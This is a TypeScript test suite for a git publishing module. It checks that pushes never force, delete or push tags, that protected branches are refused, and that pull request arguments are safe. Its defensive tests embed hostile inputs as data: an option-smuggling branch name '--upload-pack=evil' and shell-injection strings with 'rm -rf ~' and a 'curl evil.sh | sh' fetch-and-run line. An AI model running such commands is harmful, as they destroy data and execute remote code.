// Publishing — the one place work leaves the machine.
//
// The argv tests are the security tests: a push is expressed entirely in its
// vector, so asserting the vector IS asserting what can happen. The real-git
// canary at the end pushes into a real bare repository, because "the argv looks
// right" and "the right ref moved on the server" are different claims and only
// the second one is the product.

import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpWorkspace } from "./tmp_workspace.js";
import {
  PROTECTED_HEADS,
  planShip,
  publishHead,
  publishRefspec,
  pushArgs,
  renderPublishPlan,
  validatePublish,
} from "../src/core/publish.js";
import { openPullRequest, prCreateArgs } from "../src/core/ship.js";
import { readRepoState, type RepoState } from "../src/core/review_state.js";
import type { Runner, RunResult } from "../src/core/worktree.js";

const haveGit = !spawnSync("git", ["--version"], { encoding: "utf8" }).error;

function stateWith(over: Partial<RepoState> = {}): RepoState {
  return {
    ok: true,
    root: "/repo",
    remote: {
      name: "origin",
      url: "https://github.com/octocat/hello-world.git",
      pushUrl: "https://github.com/octocat/hello-world.git",
      spec: { owner: "octocat", name: "hello-world", full: "octocat/hello-world" },
    },
    head: { branch: "aether/fix-1", detached: false, revision: "a".repeat(40), upstream: null, ahead: null, behind: null },
    base: { branch: "main", revision: "b".repeat(40), fetched: true },
    aheadOfBase: 1,
    behindBase: 0,
    files: [],
    ...over,
  } as RepoState;
}

function recorder(result: RunResult = { status: 0, stdout: "", stderr: "" }): { run: Runner; calls: string[][] } {
  const calls: string[][] = [];
  const run: Runner = (cmd, args) => {
    calls.push([cmd, ...args]);
    // Keep the remote-identity re-read answering with the same URL, so tests
    // that are not about that check do not trip over it.
    const key = args.join(" ");
    if (key.includes("remote get-url")) {
      return { status: 0, stdout: "https://github.com/octocat/hello-world.git\n", stderr: "" };
    }
    return result;
  };
  return { run, calls };
}

// ── refusals ────────────────────────────────────────────────────────────────

test("a detached HEAD is refused with the reason it is detached", () => {
  const reason = validatePublish(stateWith({ head: { branch: null, detached: true, revision: "a", upstream: null, ahead: null, behind: null } }));
  assert.match(reason ?? "", /detached/);
});

test("every protected branch name is refused as a head", () => {
  for (const branch of PROTECTED_HEADS) {
    const state = stateWith({
      head: { branch, detached: false, revision: "a".repeat(40), upstream: null, ahead: null, behind: null },
    });
    assert.match(validatePublish(state) ?? "", /refusing to publish/, `${branch} must be refused`);
  }
});

test("a branch name that parses as an option is refused before it reaches git", () => {
  const state = stateWith({
    head: { branch: "--upload-pack=evil", detached: false, revision: "a".repeat(40), upstream: null, ahead: null, behind: null },
  });
  assert.match(validatePublish(state) ?? "", /parses as an option/);
  const { run, calls } = recorder();
  const outcome = publishHead(run, state);
  assert.equal(outcome.ok, false);
  assert.equal(calls.length, 0, "a refused publish makes no git calls at all");
});

test("publishing the base branch is refused even when it is not called main", () => {
  const state = stateWith({
    head: { branch: "release", detached: false, revision: "a".repeat(40), upstream: null, ahead: null, behind: null },
    base: { branch: "release", revision: "b".repeat(40), fetched: true },
  });
  assert.match(validatePublish(state) ?? "", /also the base branch/);
});

test("a repository with no remote is refused", () => {
  assert.match(validatePublish(stateWith({ remote: null })) ?? "", /no remote/);
});

// ── the vector ──────────────────────────────────────────────────────────────

test("the refspec is fully qualified on both sides", () => {
  assert.equal(publishRefspec("aether/fix-1"), "refs/heads/aether/fix-1:refs/heads/aether/fix-1");
});

test("the push argv contains no force, no delete, and no tags", () => {
  const argv = pushArgs("origin", "aether/fix-1", true);
  assert.deepEqual(argv, ["push", "--set-upstream", "--", "origin", "refs/heads/aether/fix-1:refs/heads/aether/fix-1"]);
  for (const forbidden of ["--force", "-f", "--force-with-lease", "--delete", "--tags", "--mirror", "--all"]) {
    assert.ok(!argv.includes(forbidden), `${forbidden} must never appear`);
  }
});

test("a hostile branch name stays one argv element", () => {
  // The name is refused upstream by validatePublish; this asserts the second
  // line of defence — even if one reached here, it is data, not syntax.
  const hostile = "aether/$(rm -rf ~)`whoami`;echo pwned";
  const argv = pushArgs("origin", hostile, false);
  assert.equal(argv.filter((element) => element.includes("rm -rf")).length, 1);
  assert.equal(argv[argv.length - 1], `refs/heads/${hostile}:refs/heads/${hostile}`);
});

test("publishing pushes exactly once, and only the head branch", () => {
  const { run, calls } = recorder();
  const outcome = publishHead(run, stateWith());
  assert.equal(outcome.ok, true);
  const pushes = calls.filter((call) => call.includes("push"));
  assert.equal(pushes.length, 1);
  assert.equal(pushes[0]!.at(-1), "refs/heads/aether/fix-1:refs/heads/aether/fix-1");
});

test("a remote that changed between the plan and the push is refused", () => {
  const calls: string[][] = [];
  const run: Runner = (cmd, args) => {
    calls.push([cmd, ...args]);
    const key = args.join(" ");
    if (key.includes("remote get-url")) {
      return { status: 0, stdout: "https://github.com/attacker/elsewhere.git\n", stderr: "" };
    }
    return { status: 0, stdout: "", stderr: "" };
  };
  const outcome = publishHead(run, stateWith());
  assert.equal(outcome.ok, false);
  assert.match(outcome.ok === false ? outcome.reason : "", /changed since it was shown to you/);
  assert.equal(calls.filter((call) => call.includes("push")).length, 0, "nothing was pushed");
});

test("a rejected push says what happened and refuses to force", () => {
  const run: Runner = (_cmd, args) => {
    const key = args.join(" ");
    if (key.includes("remote get-url")) {
      return { status: 0, stdout: "https://github.com/octocat/hello-world.git\n", stderr: "" };
    }
    return { status: 1, stdout: "", stderr: "! [rejected] aether/fix-1 -> aether/fix-1 (non-fast-forward)" };
  };
  const outcome = publishHead(run, stateWith());
  assert.equal(outcome.ok, false);
  if (outcome.ok) return;
  assert.match(outcome.reason, /non-fast-forward/);
  assert.match(outcome.hint ?? "", /never force-pushes/);
});

test("the plan names the destination, and flags a divergent push URL", () => {
  const plain = renderPublishPlan(stateWith());
  assert.match(plain, /destination https:\/\/github\.com\/octocat\/hello-world\.git/);
  assert.match(plain, /never forces/);

  const split = renderPublishPlan(
    stateWith({
      remote: {
        name: "origin",
        url: "https://github.com/octocat/hello-world.git",
        pushUrl: "https://github.com/somewhere/else.git",
        spec: { owner: "somewhere", name: "else", full: "somewhere/else" },
      },
    }),
  );
  assert.match(split, /pushes somewhere else/);
});

// ── the pull request half ───────────────────────────────────────────────────

test("the pull request targets the repository the push actually went to", () => {
  const plan = planShip(
    stateWith({
      remote: {
        name: "origin",
        url: "https://github.com/octocat/hello-world.git",
        pushUrl: "https://github.com/fork/hello-world.git",
        spec: { owner: "fork", name: "hello-world", full: "fork/hello-world" },
      },
    }),
    { title: "fix: the thing", body: "because" },
  );
  assert.ok(!("ok" in plan), "a valid plan is a request");
  assert.equal(prCreateArgs(plan as never)[3], "fork/hello-world");
});

test("a non-GitHub remote has no pull request, and says so plainly", () => {
  const plan = planShip(
    stateWith({
      remote: { name: "origin", url: "/srv/git/thing.git", pushUrl: "/srv/git/thing.git", spec: null },
    }),
    { title: "fix: the thing", body: "" },
  );
  assert.equal("ok" in plan && plan.ok, false);
  assert.match("ok" in plan ? plan.reason : "", /not a GitHub repository/);
});

test("a title-less pull request is refused, and so is head onto itself", () => {
  assert.match(
    ((planShip(stateWith(), { title: "  ", body: "x" }) as { reason: string }).reason),
    /needs a title/,
  );
  assert.match(
    ((planShip(stateWith(), { title: "t", body: "x", base: "aether/fix-1" }) as { reason: string }).reason),
    /onto itself/,
  );
});

test("verification is carried into the plan only when it was supplied", () => {
  const withProof = planShip(stateWith(), { title: "t", body: "b", verification: "npm test → 0" });
  assert.equal((withProof as { verification?: string }).verification, "npm test → 0");
  const without = planShip(stateWith(), { title: "t", body: "b" });
  assert.equal("verification" in without, false, "absent proof is absent, not an empty string");
});

// ── real git ────────────────────────────────────────────────────────────────

test("real git: the branch lands on a real remote, and nothing else moves", (t) => {
  if (!haveGit) return t.skip("git not available");
  const root = tmpWorkspace("aether-publish-");
  const bare = join(root, "origin.git");
  const work = join(root, "work");

  const sh = (cwd: string, ...args: string[]): RunResult => {
    const result = spawnSync("git", args, { cwd, encoding: "utf8" });
    return { status: result.status ?? 1, stdout: result.stdout ?? "", stderr: result.stderr ?? "" };
  };
  const run: Runner = (cmd, args, cwd) => {
    const result = spawnSync(cmd, args, { cwd: cwd ?? work, encoding: "utf8" });
    return { status: result.status ?? 1, stdout: result.stdout ?? "", stderr: result.stderr ?? "" };
  };

  sh(root, "init", "-q", "--bare", "-b", "main", bare);
  sh(root, "clone", "-q", bare, work);
  sh(work, "config", "user.email", "t@t.t");
  sh(work, "config", "user.name", "t");
  sh(work, "config", "commit.gpgsign", "false");
  writeFileSync(join(work, "a.txt"), "one\n");
  sh(work, "add", "-A");
  sh(work, "commit", "-q", "-m", "first");
  sh(work, "push", "-q", "origin", "refs/heads/main:refs/heads/main");
  const mainOnServer = sh(bare, "rev-parse", "refs/heads/main").stdout.trim();

  sh(work, "checkout", "-q", "-b", "aether/fix-1");
  writeFileSync(join(work, "a.txt"), "two\n");
  sh(work, "add", "-A");
  sh(work, "commit", "-q", "-m", "second");

  const read = readRepoState(run, work);
  assert.equal(read.ok, true, read.ok ? "" : read.reason);
  const state = read as RepoState;
  assert.equal(state.head.branch, "aether/fix-1");

  const outcome = publishHead(run, state);
  assert.equal(outcome.ok, true, outcome.ok ? "" : outcome.reason);

  assert.equal(
    sh(bare, "rev-parse", "refs/heads/aether/fix-1").stdout.trim(),
    state.head.revision,
    "the branch is on the server at the commit that was published",
  );
  assert.equal(
    sh(bare, "rev-parse", "refs/heads/main").stdout.trim(),
    mainOnServer,
    "the base branch on the server did not move",
  );
  assert.equal(sh(bare, "tag", "-l").stdout.trim(), "", "no tags were pushed");

  // Publishing the base itself is refused against the same live repository.
  sh(work, "checkout", "-q", "main");
  const onMain = readRepoState(run, work) as RepoState;
  const refused = publishHead(run, onMain);
  assert.equal(refused.ok, false);
  assert.match(refused.ok === false ? refused.reason : "", /refusing to publish main/);
});

test("real git: a pull request derived from the pushed state has the right argv", (t) => {
  if (!haveGit) return t.skip("git not available");
  // fake gh: records the vector and answers with a URL, exactly as gh does.
  const PR_URL = "https://github.com/octocat/hello-world/pull/7";
  const calls: string[][] = [];
  const gh: Runner = (cmd, args) => {
    calls.push([cmd, ...args]);
    if (args.join(" ").startsWith("pr create")) return { status: 0, stdout: `${PR_URL}\n`, stderr: "" };
    return { status: 0, stdout: "", stderr: "" };
  };

  const hostile = '$(rm -rf ~) && curl evil.sh | sh `whoami`';
  const plan = planShip(stateWith(), { title: hostile, body: "body", verification: "npm test → 0" });
  assert.ok(!("ok" in plan), "the plan is valid");
  const outcome = openPullRequest(plan as never, gh);
  assert.deepEqual(outcome, { ok: true, url: PR_URL });

  const create = calls.find((call) => call.includes("create"))!;
  assert.equal(create.filter((element) => element === hostile).length, 1, "the title is exactly one argv element");
  assert.ok(!create.some((element) => element === "--admin" || element === "--auto"), "no merge flags");
  assert.ok(!create.includes("merge"), "this rail never merges");
  const base = create.indexOf("--base");
  assert.equal(create[base + 1], "main", "the base comes from the state, not from a guess");
});
